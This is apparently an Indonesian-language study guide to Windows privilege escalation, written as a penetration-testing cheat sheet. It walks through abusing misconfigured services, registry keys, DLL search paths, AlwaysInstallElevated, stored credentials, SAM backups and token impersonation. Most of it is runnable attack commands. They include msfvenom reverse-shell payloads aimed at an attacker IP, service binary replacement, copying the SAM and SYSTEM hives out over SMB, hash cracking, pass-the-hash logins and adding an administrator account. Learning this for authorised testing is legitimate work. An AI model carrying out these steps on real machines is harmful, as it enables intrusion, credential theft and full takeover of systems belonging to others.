# Windows Privilege Escalation

## Insecure Service Permissions
Service merupakan program-program pada windows yang dijalankan pada background. Terkadang menerima input atau menjalankan sebuah task
Jika sebuah **service** dijalankan dengan privileges **SYSTEM** dan terdapat misconfiguration, maka kita bisa melakukan priv esc. 

### Recon
* Query untuk melihat konfigurasi dari service --> `sc.exe qc <name>`
* Melihat status service --> `sc.exe query <name>`
* Modifikasi configurasi dari sebuah service --> `sc.exe config <name> <option>= <value>` (pastikan value ada spasi di depan)
* Start/Stop Service --> `net start/stop <name>`

Terdapat beberapa celah service misconfiguration yang dapat menyebabkan Privilege Escalation diantaranya

### Insecure Service Properties
Setiap service memiliki Access Control (ACL) tentang siapa yang berhak mengakses service tersebut seperi Start/Stop, mengubah konfigurasi dll. Jika low user memiliki hak akses untuk merubah konfigurasi dari service yang dijalankan dengan privilege SYSTEM, maka kita bisa mengganti service tersebut dengan milik kita dengan merubah konfig. Namun kalau kita bisa ganti tapi gak bisa start/stop, maka kemungkinan tidak bisa di escalate.

#### RECON

Menggunakan WINPEAS untuk mencari informasi service yang terdapat pada windows
```
.\winPEASany.exe quiet servicesinfo
```
Penjelasan command :
- quiet --> do not print banner, biasanya winpeas bannernya gede banget
- servicesinfo --> mencari informasi service

Hasil dari servicesinfo yang perlu diperhatikan adalah "YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles" (teks berwarna merah) yang artinya sebuah service bisa diubah konfigurasinya. 

Lalu lakukan pengecekan pada service apakah benar service tersebut bisa dimodifikasi, gunakan tools accesschk.exe
```
accesschk.exe /accepteula -uwcqv <nama_user_low_privilege> <nama_service>
```
Hasilnya :
```
RW MyService
	SERVICE_QUERY_STATUS
	SERVICE_QUERY_CONFIG
	SERVICE_CHANGE_CONFIG
	SERVICE_INTERROGATE
	SERVICE_ENUMERATE_DEPENDENTS
	SERVICE_START
	SERVICE_STOP
	READ_CONTROL
```
Yang terpenting adalah 
```
SERVICE_CHANGE_CONFIG
SERVICE_START
SERVICE_STOP
```
Artinya kita bisa ubah konfigurasi dan untuk bisa menerapkan perubahan maka kita harus restart (start/stop) service. 

Lalu kita cek konfigurasi dari service tersebut
```
sc qc <nama service>
```
```
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```
Lihat pada SERVICE_START_NAME service tersebut dijalankan oleh SYSTEM (hak akses tertinggi). Dan juga pada START_TYPE valuenya DEMAND_START yang artinya di start secara manual

Selanjutnya kita cek status servicenya, apakah sedang berjalan atau tidak
```
sc query <nama service>
```
Lihat pada STATE apakah STOPPED or RUNNING

Bagaimana cara melakukan PRIV ESC? perhatikan lagi informasi service berikut :

```

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

Karena kita memiliki hak akses untuk merubah konfigurasi, maka kita bisa merubah **BINARY_PATH_NAME** menjadi PATH dimana kita menyimpan file untuk melakukan reverse shell. Perintahnya adalah

```
sc config <nama_service> binpath= "\"C:\myFolder\reverse.exe\""
```
Sehingga BINARY_PATH_NAME berubah menjadi `C:\myFolder\reverse.exe`, untuk menerapkan perubahan pada konfigurasi, perintahnya
```
net start <nama_service>
```
Dan jika berhasil maka akan BOOM BOOM PWn3D!


### Unquoted Service Path
FIle executable di Windows bisa dijalankan tanpa mengetikkan extension. Contohnya `whoami.exe` bisa dijalankan dengan perintah `whoami`. Beberapa file executables juga biasanya menerima input argumen dipisahkan dengan space, contohnya `myprog.exe arg1 arg2 arg3`

Unquoted Service Path adalah service pada windows yang dijalankan menggunakan absolute path dimana absolute path tersebut tidak menggunakan tanda kurung (quotes) dan memiliki spasi. Contohnya sebagai berikut :

Absolute Path yaitu full path, misalnya `C:\Users\MrDoel\Desktop\myprog.exe`. Vulnerability Unquoted Service Path yang dimaksud adalah bilamana path tersebut tidak memiliki quote dan ada spasi seperti `C:\Program Files\Some Dirs\myprog.exe` , kita kita akan menjalankan file `myprog.exe`, maka windows akan melihat dari awal path, misalnya windows akan melihat dari `Program.exe` dari `Program Files` karena `Program Files` memiliki spasi, maka windows akan menganggap Program sebagai file executables, sedangkan `Files` adalah argumennya. Jadi kira-kira seperti ini `C:\Program.exe Files\Some` . Selanjutnya jika `Program.exe` tidak bisa dieksekusi maka windows akan melakukan segala kemungkinan misalnya `C:\Program.exe Files\Some Dir\myprog.exe` artinya `Program.exe` menggunakan dua argumen dan windows akan melakukannya sampai akhirnya  bisa mengeksesekusi file `myprog.exe`. Berbeda halnya jika absolute path diberikan tanda kurung `"C:\Users\MrDoel\Desktop\myprog.exe"`, maka windows akan langsung mengekseskusi `myprog.exe`. Inilah yang dimaksudnya Unquoted Service Path atau Path sebuah service yang tanpa menggunakan quote.


#### Recon
Untuk melihat apakah ada Unquoted Service Path, gunakan perintah
```
winPEASany.exe quiet servicesinfo
```

Yang perlu diperhatikan adalah result berikut
```
unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
```
Hasil diatas menjelaskan bahwa path dari file `unquotedpathservice.exe` tidak memiliki quote dan memiliki space. 

Ketika Windows akan menjalankan `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe` maka Windows akan melakukan pengecekan pada `Program.exe files`, `Unquoted.exe Path Service`, `Common.exe Files` dan akhirnya file `unquotedpathservice.exe`, jika kita bisa menyisipkan file yang kita miliki pada salah satu path tersebut maka kita bisa melakukan RCE seperti Reverse Shell

Untuk cek apakah vulnerability ini bisa digunakan, kita cari tahu dulu apakah kita bisa start/stop service tersebut. 
```
accesschk.exe /accepteula -ucqv <nama_user_low_privilege> <nama_service>
```
Perhatikan disini yang kita inputkan adalah nama servicenya, bukan nama file

Contoh :
```
accesschk.exe /accepteula -ucqv mrdoel unquotedsvc
```

Hasil 
```
SERVICE_START
SERVICE_STOP
```

Selanjutnya kita harus mencari tau dimana kita bisa menyisipkan file kita. Seperti diketahui pada penjeleasan sebelumnya, kita memiliki 4 Direktori yaitu,
* C:\
* C:\Program FIles
* C:\Program Files\Unquoted Path Service
* C:\Program Files\Unquoted Path Service\Common Files

Cara untuk mengetahuinya adalah dengan menggunakan perintah
```
accesschk.exe /accepteula -uwdq "C:\"
accesschk.exe /accepteula -uwdq "C:\Program FIles"
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\Common Files"

```

Perintah diatas menunjukkan kita mencari dari ke empat folder dimana kira-kira yang memiliki permission READ dan WRITE (RW), yang perlu diperhatikan dari hasil identifikasi adalah 
```
RW BUILTIN\Users
```
Artinya Group Users bisa melakukan READ and WRITE pada direktori tersebut. Pastikan kita berada di Group Users. Sebagai contoh direktori `Unquoted Path Service` memiliki permission RW pada Group Users, maka kita bisa menyimpan file executables dengan nama `Common.exe`, kenapa `Common.exe` ??? perhatikan lagi di penjelasan awal 

>Ketika Windows akan menjalankan `C:\Program Files\Unquoted Path Service\Common Files` maka Windows akan melakukan pengecekan pada `Program.exe files`, `Unquoted.exe Path Service`, `Common.exe Files` dan akhirnya file `unquotedpathservice.exe`

Karena direktori `Unquoted Path Service` memiliki permission RW, maka windows akan mengeksekusi pada path `C:\Program Files\Unquoted Path Service\Common.exe`

Selanjutnya kita copy file executable reverse shell ke direktori tersebut

```
copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
```

Lalu jalankan service
```
net start unquotedsvc
```

Maka windows akan mengeksekusi file `Common.exe`
### Weak Registry Permissions
Registry pada windows menyimpan informasi konfigurasi pada setiap service. Registery biasanya memiliki hak akses (ACL). Jika ACL ini tidak dikonfigurasi dengan baik, maka kemungkinan attacker bisa merubah konfigurasi service bahkan ketika ketika kita tidak bisa secara langsung memodifikasi service tersebut,

#### Recon
Untuk melihat apakah ada Unquoted Service Path, gunakan perintah
```
winPEASany.exe quiet servicesinfo
```

Yang perlu diperhatikan adalah result berikut
```
[?] Check if you can modify the registry of a service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-permissions
    HKLM\system\currentcontrolset\services\regsvc (Interactive [TakeOwnership])
```

Result diatas menginformasikan bahwa registry pada service `regsvc` bisa dimodifikasi. Untuk melakukan pengecekan terkait service ini kita gunakan accesschk
```
accesschk.exe /accepteula -uvwqk HKLM\system\currentcontrolset\services\regsvc
```
Hasilnya
```
HKLM\system\currentcontrolset\services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
	KEY_ALL_ACCESS
  RW BUILTIN\Administrators
	KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
	KEY_ALL_ACCESS
```

Yang perlu diperhatikan adalah 
```
RW NT AUTHORITY\INTERACTIVE
	KEY_ALL_ACCESS
```

`AUTHORITY\INTERACTIVE` adalah Group user yang bisa mengakses OS windows, termasuk user low privileged yang mungkin didapatkan dari reverse shell. KEY_ALL_ACCESS maksudnya user tersebut mendapatkan akses fullcontrol terhadap registry. 

Selanjutnya setelah kita mengetahui bahwa kita mendapat fullcontrol, cek apakah kita bisa start/stop service. 

```
accesschk.exe /accepteula -ucqv mrdoel regsvc
```

Sekarang cek value dari registrty tersebut
```
reg query HKLM\system\currentcontrolset\services\regsvc
```
Hasilnya
```
HKEY_LOCAL_MACHINE\system\currentcontrolset\services\regsvc
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
    DisplayName    REG_SZ    Insecure Registry Service
    ObjectName    REG_SZ    LocalSystem

```
Dari result diatas, yang menarik adalah `ObjectName` dijalankan oleh SYSTEM (hak akses tertinggi) dan `ImagePath` dimana berisi value `C:\Program Files\Insecure Registry Service\insecureregistryservice.exe`. 

Karena kita memiliki fullaccess terhadap registry ini, maka kita bisa mengubah `ImagePath` menjadi path yang kita inginkan. 

```
reg add HKLM\system\currentcontrolset\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```

Lakukan verifikasi kembali apakah path sudah terganti. Jika sudah maka jalankan service tersebut
```
net start regsvc
```

Maka service akan menjalankan file executable yang berada di `C:\PrivEsc\reverse.exe`


### Insecure Service Executables
Jika sebuah file executable service bisa dimodifikasi oleh user, maka kita hanya tinggal me-replace service tersebut dengan file exec milik kita. Misal file untuk reverse shell. 

#### Recon
Untuk melihat apakah ada Unquoted Service Path, gunakan perintah
```
winPEASany.exe quiet servicesinfo
```

Yang perlu diperhatikan adalah result berikut
```
filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
    File Permissions: Everyone [AllAccess]
```

Result diatas menginformasikan bahwa service filepermsvc yang berada di `C:\Program Files\File Permissions Service\filepermservice.exe` dimana semua user memiliki full akses terhadap service tersebut.

Lakukan verifikasi 
```
accesschk.exe /accepteula -quvw user "C:\Program Files\File Permissions Service\filepermservice.exe"
```

Hasilnya `FILE_ALL_ACCESS` yang artinya kita memiliki full access seperti menghapus file service tersebut.

Lalu cek apakah kita bisa start/stop
```
accesschk.exe /accepteula -ucqv mrdoel filepermsvc
```

Lalu kita replace `filepermservice.exe` dengan file executable reverse shell
```
copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
```

Lalu start service

```
net start filepermsvc
```

### DLL Hijacking
Biasanya sebuah service membutuhkan library agar service tersebut bisa berjalan dengan baik. library inilah yang dinamakan DLL (dynamic-link library). 

Untuk mencari celah ini agak rumit karena membutuhkan manual testing. 

Biasanya celah ini bisa terjadi jika DLL ini di load dengan menggunakan absolute path sehingga kemungkinan kita bisa melakukan priv esc dengan syarat path tersebut harus writable. Lalu celah lainnya yang sering terjadi adalah `DLL Missing` yang artinya service tidak menemukan DLL pada system sehingga attacker bisa membuat file DLL dan memasukkannya ke dalam direktori dimana DLL tersebut akan di load oleh windows (biasanya windows akan melakukan pengecekahn pada environtmet variable PATH)

#### Recon

```
winPEASany.exe quiet servicesinfo
```

Result :
```
dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice.exe"] - Manual - Stopped

(DLL Hijacking) C:\Temp: Authenticated Users [WriteData/CreateFiles]

```

Result diatas menginformasikan bahwa service `dllsvc` terdapat celah DLL Hijacking lalu ada info selanjutnya bahwa PATH pada direktori `C:\Temp` writable. 

Cek service apakah bisa start/stop

```
accesschk.exe /accepteula -uvqc user dllsvc
```

Jika bisa, selanjutnya kita cek lagi terkait service tersebut
```
sc qc dllsvc
```

Hasilnya
```
SERVICE_NAME: dllsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : DLL Hijack Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```

Pada `SERVICE_START_NAME` dijalankan oleh SYSTEM

Normalnya kita harus melakukan process monitoring terhadap file `dllhijackservice.exe`

![[procmon.png]]

Terlihat pada gambar diatas, windows tidak menemukan `hijackme.dll` dan mencarinya di semua PATH. Perhatikan bahwa direktor `C:\Temp` berada pada path. Disini kita bisa menambahkan file `hijackme.dll` sehingga menjadi `C:\Temp\hijackme.dll`

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.8 LPORT=4545 -f dll -o hijackme.dll
```

Transfer ke windows lalu restart service

```
net stop dllsvc
net start dllsvc
```

## Registry Exploits
WIndows bisa menjalankan perintah-perintah yang secara otomatis dijalankan ketika startup. Proses ini dinamakan autorun yang dikonfigurasi pada registry.

Terdapat celah keamanan bilamana kita memilki hak akses untuk membuat file executable autorun dan ability untuk restart sistem. As soon as windows restarted, kita bisa langsung dapat reverse shell. 

### Recon
```
winPEASany.exe quiet applicationsinfo
```

Result :
```
[+] Autorun Applications(T1010)

Folder: C:\Program Files\Autorun Program
    File: C:\Program Files\Autorun Program\program.exe
    FilePerms: Everyone [AllAccess]
    RegPath: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

```

Selanjutnya cek autorun yang saat ini berada pada windows
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Lalu cek hak akses
```
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

Pastikan kita punya akses RW
```
RW Everyone
	FILE_ALL_ACCESS

```

Lalu copy file `reverse.exe` ke direktori `C:\Program Files\Autorun Program` dan rename menjadi `program.exe`

Lalu restart windows

### AlwaysInstallElevated
File berformat MSI adalah sebuah package yang digunakan untuk install aplikasi. File ini dijalankan dengan permission sesuai dengan user yang menjalankan. Windows mengizinkan installer ini untuk dijalakan dengan user administrator. Artinya kita bisa membuat malicious MSI yang berfungsi untuk reverse shell.

Hal yang perlu diperhatikan untuk mengetahui celah ini adalah melalui registry, kita harus memastikan bahwa konfigurasi `AlwaysInstallElevated` yang terdapat pada:
`HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` dan `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer` bernilai 1, jika registry ini disabled dan bernilai 0 maka expoit tidak akan bekerja

#### Recon
```
winPEASany.exe quiet windowscreds
```
Yang perlu diperhatikan dari output winpeas adalah sebagai berikut :
```
 [+] Checking AlwaysInstallElevated(T1012)
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```
Yang artinya `AlwaysInstallElevated` enabled dan kita bisa menjalankan exploit MSI. Untuk melakukan verifikasi, kita bisa gunakan command 

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

dan 

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```
Hasilnya
```
AlwaysInstallElevated    REG_DWORD    0x1
```

`0x1` merupakan nilai hexa yang jika dikonversi ke desimal adalah 1
Oke, selanjutnya kita buat file malicious MSI yang berisi reverse shell
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.8 LPORT=4545 -f msi -o reverse.msi
```
Lalu upload ke Windows target dan install aplikasi tersebut menggunakan privilege admin. 
```
msiexec /quiet /qn /i reverse.msi
```
Jangan lupa jalankan listener di attacker machine agar bisa menerima koneksi dari target. 

## Passwords
Terkadang admin menyimpan password di direktori tertentu, kita harus nyari manual disini. 

Ada lagi password yang disimpan pada WIndows registry cara untuk mencari password di registry adalah 
```
reg query HKLM /f password /t REG_SZ /s

atau 

reg query HKCU /f password /t REG_SZ /s
```

terkadang banyak hasilnya, coba saring lagi. 

#### Recon
```
winPEASany.exe quiet filesinfo userinfo
```
Hasilnya akan sangat banyak , contohnya winpeas akan mencari user autologon :

```
[+] Looking for AutoLogon credentials(T1012)
    Some AutoLogon credentials were found!!
    DefaultUserName               :  admin
    DefaultPassword               :  password123

```

ada juga putty session
```
+] Putty Sessions()
    SessionName: BWP123F42
    ProxyPassword: password123
    ProxyUsername: admin

```

Untuk melakukan verifikasi terkait user autologoun kita bisa gunakan command berikut :
```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```
Pada kali linux kita bisa menggunakan `winexe` untuk mendapatkan akses shell dari target
```
winexe -U 'admin%password123' //192.168.1.9 cmd.exe
```
Untuk menjalankan winexe agar bisa masuk ke privilege SYSTEM (Admin) gunakan perintah
```
winexe -U 'admin%password123' --system //192.168.1.7 cmd.exe
```

### Saved Creds
Pada windows terdapat perintah `runas` dimana kita bisa menjalankan program dengan privilege user lain misalnya admin. Biasanya hal ini membutuhkan password user lain agar bisa dijalankan oleh user kita saat ini. 

Nah, Windows mengizinkan user untuk menyimpan credentials pada system yang disebut dengan Saved Creds, Saved Creds inilah yang bisa kita gunakan untuk melakukan bypass, sehingga kita tidak perlu mengetahui password untuk menjalankan suatu perintah/aplikasi/program dengan privilege user lain. 

#### Recon
```
winPEASany.exe quiet cmd windowscreds
```
Hasilnya
```
  [+] Checking Credential manager()
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault

Currently stored credentials:

    Target: MicrosoftAccount:target=SSO_POP_Device
    Type: Generic 
    User: 02tzrympzjqpdvtu
    Saved for this logon only
    
    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic 
    User: 02tzrympzjqpdvtu
    Local machine persistence
    
    Target: Domain:interactive=DESKTOP-FHFUEUQ\admin
    Type: Domain Password
    User: DESKTOP-FHFUEUQ\admin

```

Terdapat Saved Creds Admin. Kita bisa verifikasi manual dengan cara 
```
cmdkey /list
```
Dari hasil ini kita bisa menjalankan file reverse shell dengan user sebagai admin
```
runas /savecreds /user:admin C:\PrivEsc\rev.exe
```

### Configuration Files
Terkadang administrators menyimpan file configurations pada sistem yang berisi password. 

File Unattend.xml adalah contohnya, file ini bisa digunakan oleh admin untuk melakukan automated setup pada sistem windows

#### Recon
```
winPEASany.exe quiet cmd searchfast filesinfo
```
Hasilnya
```
[+] Unnattend Files()
    C:\Windows\Panther\Unattend.xml
<Password>     
```
Selanjutnya kita lihat isi dari `Unattend.xml`
```
type C:\Windows\Panther\Unattend.xml
```
Dan cari password di dalamnya. 

### SAM
Windows menyimpan password hash dari semua user pada Security Account Manager (SAM). Hash yang disimpan terenkripsi dengan key yang disimpan ada file dengan nama `SYSTEM`. Jika kita memiliki hak akses untuk membaca file `SAM` dan `SYSTEM`, maka kita bisa extract hash lalu dump dengan menggunakaan SAMDUMP2

File `SAM` dan `SYSTEM` tersimpan di `C:\Windows\System32\config`, namun file-file ini terkunci ketika windows sedang berjalan. 

Kita bisa mencari apakah terdapat backup dari file-file ini pada direktori `C:\Windows\Repair` atau `C:\Windows\System32\config\RegBack`
#### Recon
```
winPEASany.exe quiet cmd searchfast filesinfo
```
Hasilnya
```
[+] Looking for common SAM & SYSTEM backups()
    C:\Windows\repair\SAM
    C:\Windows\repair\SYSTEM
```
Copy file ini ke Kali Linux, jika SMB tersedia, gunakan perintah :
```
copy C:\Windows\repair\SAM \\192.168.1.8\tools\
copy C:\Windows\repair\SYSTEM \\192.168.1.8\tools\
```

Lalu kita dump username dan hash menggunakan samdump2
```
samdump2 SYSTEM SAM
```
Hasilnya :
```
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
MRDoel:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
admin:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Crack hash NTLM menggunakan hashcat, target `admin:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`
Command :
```
hashcat -m 1000 --force 31d6cfe0d16ae931b73c59d7e0c089c0 /usr/share/wordlists/rockyou.txt
```

Terkadang windows juga menerima login dengan hash, jadi kita gak perlu tau passwordnya. Kita bisa menggunakan tools `pth-winexe` untuk login, contohnya
```
pth-winexe -U 'admin@aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' //192.168.1.7 cmd.exe
```

Kalau belum login sebagai admin tambahkan paramter --system
```
pth-winexe --system -U 'admin@aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0' //192.168.1.7 cmd.exe
```


## Scheduled Task
Windows mengizinkan kita untuk melakukan penjadwalan task, sama seperti cron job di linux. Cara untuk mencari ini dengan manual. 

contoh file schedules contoh nama filenya RunThis.ps1
```
# This script will clean up all your old dev logs every minute.
# To avoid permissions issues, run as SYSTEM (should probably fix this later)

Remove-Item C:\DevTools\*.log

```

Lalu cek permissionnya
```
accesschk.exe /accepteula -quv user RunThis.ps1
```

kalau ada WRITE berarti kita bisa masukkan perintah untuk menjalankan reverse shell
```
copy RunThis.ps1 C:\Temp\    #backup file
echo C:\PrivEsc\reverse.exe >> RunThis.ps1 #copy path file to RunThis.ps1
```
Dan tunggu sampai windows mengeksekusi 

## Insecure GUI Apps (Citrix Method)
Pada versi windows yang lama, user bisa di granted untuk menjalanakn GUI apps dengan privilege administrator.

Terdapat berbagai ceara untuk spawn command prompts (reverse shell) dari GUI apps, salah satunya menggunakan fungsi native Windows

#### Recon
```
C:\DevTools>tasklist /V | findstr mspaint.exe
tasklist /V | findstr mspaint.exe
mspaint.exe                   1748 Console                    2     27.924 K Running         DESKTOP-FHFUEUQ\admin                                   0:00:00 Untitled - Paint 
```
Command diatas digunakan untuk melihat program dijalankan oleh siapa, dalam hal ini mspaint.exe dijalankan oleh admin. 

Jika RDP tersedia, maka kita bisa buka mspaint.exe lalu open file cmd, maka kita akan membuka cmd sebagai administrator.

![[insecureGui.PNG]]

## Startup Apps
Setiap user dapat menentukan aplikasi apa aja yang otomatis dijalankan ketika mereka login dengan cara menempatkan shortcut pada directory tertentu

Windows secara default memiliki direktori untuk aplikasi yang akan dijalankan ketika startup, yaitu di `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`. Jika kita memiliki hak akses WRITABLE pada direktori ini kita bisa menyimpan reverse shell pada direktor tersebut yang akan dijalankan setiap kali startup. 

#### Recon
Kita cek apakah direktori Startup memiliki hak akses writable
```
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
Jika ada result `RW BUILTIN\Users` atau `RW Desktop\MyUser` artinya direktori tersebut writable. Jika ingin menempatkan aplikasi di direktori ini, maka harus berupa shortcut, gak bisa langsung `aplikasi.exe` cara untuk membuat shortcut ini bisa dengan vbscript

Buat file dengan nama `CreateShortcut.vbs`, lalu paste kode berikut :
```
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

Yang perlu diperhatikan adalah `oLink.TargetPath`, yaitu path aplikasi yang kita miliki . Lalu jalankan script. 

```
cscript CreateShortcut.vbs
```

Tinggal menunggu restart dari administrator, maka secara otomatis file shortcut yang kita buat akan berjalan. 

## Installed Applications
Kita bisa exploit aplikasi yang terinstall di windows. Untuk mencari exploit priv esc bisa lihatdi exploit-db atau web lainnya. As soon as kita dapatkan exploitnya, maka kita bisa jalankan di windows. 

#### Recon
Melihat task yg sedang berjalan
```
tasklist /V
```
Terkadang ada aplikasi non-standard yang biasanya aplikasi ini memiliki celah keamanan. Untuk cek aplikasi non-standard,kita bisa gunakan tool seatbelt.exe
```
.\seatbelt.exe NonstandardProcesses
```
Kita juga bisa pakai winpeas
```
winPEASany.exe quiet processinfo
```

## Hot Potato
```
.\potato.exe -ip <ip_local_windows> cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

## Token Impersonate

Windows menggunakan Token sebagai Identifier untuk setiap pengguna. Token ini di generate saat login. Ada celah keamanan dimana user biasa bisa melakukan priv esc bilamana user kita saat ini memiliki permission seDebugPrivilege dan SeImpersonatePrivilege

Untuk cek apakah user kita saat ini bisa impersonate token

cek di CMD :
`whoami /priv`

pastikan  `SeImpersonatePrivilege` enabled. 

Lalu cek user mana saja yang bisa di impersonate. Kita bisa pakai incognito.exe, commandnya :

```
* incognito.exe list tokens -u //list token available to impersonate
* incognito.exe add_user mrdoel 123456 //add new user
* incognito.exe add_localgroup_user Administrators mrdoel  //add new user to the local administrators group
* net user mrdoel //cek apakah user sudah ditambahkan ke group administrator (Local Group Memberships      *Administrators)
```

Jika RDP tersedia maka kita bisa login sebagai root dengan command
`rdesktop -u mrdoel -p 123456 target.local`

### Teknik Baru Token Impersonate 
Cara sebelumnya hanya berlaku untuk windows dibawah windows 10. Jika cara diatas tidak bisa maka kita bisa gunakan PrintSpoofer, targetnya Windows 10 and Server 2016/2019. 

Note: pastikan `SeImpersonatePrivilege` berstatus `Enabled`

Cek di https://github.com/itm4n/PrintSpoofer/releases

Perintah untuk menjalankan exploit
```PrintSpoofer64.exe -i -c cmd```

atau bisa juga seperti ini
```
PrintSpoofer64.exe -i -c "C:\Temp\Reverse.exe"
```

### Juicy Potato
Pada Windows terdapat user dengan privilege services. User ini tidak bisa login, karena dia hanya bertugas untuk menjalankan tugas / service misal apache, mssql dll. Terdapat celah keamanan ketika user service ini memiliki privileges `SeImpersonatePrivilege`  atau `SeAssignPrimaryToken`dimana bisa melakukan token impersonate. 

Cara untuk exploit celah ini adalah dengan menggunakan Juice Potatal https://github.com/ohpe/juicy-potato  , juicy potato hanya work sampai windows 7. Sedangkan untuk windows 10 kita bisa gunakan Rogue Potato

Cek dulu `whoami /priv`

Lalu cara untuk menjalankan juicy potato
```
.\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {xxx}
```

Penjelasan
* -l local port
* -p program yang akan dijalankan
* -t createprocess all
* -c CLSID, adalah unique number untuk mengidentifikasi setiap komponen aplikasi di windows. cek disini https://github.com/ohpe/juicy-potato/tree/master/CLSID , sesuaikan dengan sistem operasi dan privilege. Misalnya Windows 7 dan privilege `NT AUTHORITY\SYSTEM` maka CLSID nya ``{03ca98d6-ff5d-49b8-abc6-03dd84127020}``

```
.\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

## Port Fowarding
Terkadang ada exploit yang mudah ditemukan namun program yang ingin kita exploit itu berjalan di local system (hanya bisa diakses local). Dalam hal ini kita perlu melakukan **port forwarding**. 

Dalam kasus ini kita perlu mem-forward port pada attacker machine ke internal port yang ada di windows

kita bisa menggunakan tool `plink.exe`
```
.\plink.exe root@attacker.local -R 445:127.0.0.1:445

```
Perintah diatas berfungsi untuk port forwarding dari 445 attacker machine ke port 445 target machine

## getsystem (Named pipes & token duplication)

## Priv Esc Strategy
1. Cek user kita saat ini dengan perintah `whoami` dan juga groups `net user <username>`
2. Jalankan winpeas dengan argument `fast` , `searchfast`, dan `cmd`
3. Jalankan tool `seatbelt.exe` dan script lainnya diatas
4. Jika script/exploit kita gagal dan bingung mau ngapain lagi, coba baca manual command di link berikut. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
5. Deep Dive, jangan menyerah, baca semua hasil dari enumeration
6. Jika winpeas atau tools lainnya menemukan sesuatu, jangan lupa dicatat
